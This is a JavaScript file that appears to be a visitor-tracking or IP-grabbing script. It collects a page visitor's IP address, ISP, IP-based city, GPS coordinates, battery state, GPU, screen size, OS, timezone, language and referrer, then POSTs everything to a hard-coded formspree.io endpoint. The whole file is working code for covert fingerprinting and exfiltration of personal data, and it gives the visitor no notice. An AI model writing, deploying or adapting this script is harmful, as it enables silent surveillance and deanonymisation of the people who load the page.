var canRunAds = true;

function detectAndroidVersion() {
    const ua = navigator.userAgent;
    const match = ua.match(/Android\s([0-9\.]+)/i);
    if (!match) return "Not Android";
    return "Android " + match[1];
}

function getOS() {
    const ua = navigator.userAgent;

    if (/Android/i.test(ua)) return "Android";
    if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
    if (/Windows Phone/i.test(ua)) return "Windows Phone";
    if (/BlackBerry|BB10/i.test(ua)) return "BlackBerry";

    if (ua.includes("Windows NT")) return "Windows";
    if (ua.includes("Mac OS")) return "MacOS";
    if (ua.includes("CrOS")) return "ChromeOS"; 
    
    if (ua.includes("Linux")) return "Linux";
    if (ua.includes("FreeBSD")) return "FreeBSD";
    if (ua.includes("OpenBSD")) return "OpenBSD";
    if (ua.includes("NetBSD")) return "NetBSD";
    if (ua.includes("SunOS")) return "Solaris";

    return "Unknown OS";
}

function getGPU() {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl");
    if (!gl) return "Unavailable";
    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
    return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
}

async function getIPData() {
    try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipJson = await ipRes.json();
        const ip = ipJson.ip;
        const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
        const geoJson = await geoRes.json();
        return { ip: ip, country: geoJson.country_name || "Unavailable", city: geoJson.city || "", org: geoJson.org || "Unavailable" };
    } catch {
        return { ip: "Unavailable", country: "Unavailable", city: "", org: "Unavailable" };
    }
}

async function getGPS() {
    return new Promise(resolve => {
        if (!navigator.geolocation) {
            resolve({ lat: "Unavailable", lon: "Unavailable" });
            return;
        }
        navigator.geolocation.getCurrentPosition(pos => {
            resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude });
        }, () => {
            resolve({ lat: "Denied", lon: "Denied" });
        });
    });
}

async function getBatteryInfo() {
    let battery = {};
    try {
        if (navigator.getBattery) {
            const bat = await navigator.getBattery();
            battery = { level: Math.round(bat.level * 100) + "%", charging: bat.charging };
        } else {
            battery = "Not Supported";
        }
    } catch (e) {
        battery = "Blocked";
    }
    return battery;
}

function checkAdBlocker() {
    const testAd = document.createElement('div');
    testAd.innerHTML = '&nbsp;';
    testAd.className = 'adsbox';
    document.body.appendChild(testAd);
    window.setTimeout(function() {
        if (testAd.offsetHeight === 0) {
            canRunAds = false;
        }
        testAd.remove();
    }, 100);
    return canRunAds ? "Disabled" : "Enabled";
}

async function collect() {
    const ipData = await getIPData();
    const gps = await getGPS();
    const battery = await getBatteryInfo();
    const adBlockStatus = checkAdBlocker();
    const currentOS = getOS();
    const androidVer = detectAndroidVersion();

    return {
        TIME: new Date().toString(),
        IP: ipData.ip,
        LOCATION: ipData.country + " " + ipData.city,
        ISP: ipData.org,
        GPS_LATITUDE: gps.lat,
        GPS_LONGITUDE: gps.lon,
        BATTERY_INFO: battery,
        AD_BLOCKER: adBlockStatus,
        BROWSER: navigator.userAgent,
        OS: currentOS,
        Android_V: androidVer,
        SCREEN: screen.width + "x" + screen.height,
        TIMEZONE: Intl.DateTimeFormat().resolvedOptions().timeZone,
        LANGUAGE: navigator.language,
        GPU: getGPU(),
        PLATFORM: (currentOS === "Android") ? androidVer : navigator.platform,
        TOUCH: navigator.maxTouchPoints > 0 ? "Yes" : "No",
        REFERRER: document.referrer || "Direct"
    };
}

async function sendData() {
    const data = await collect();
    try {
        await fetch("https://formspree.io/f/maqpoaly", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });
    } catch (e) {
        console.error("Data transmission failed");
    }
}
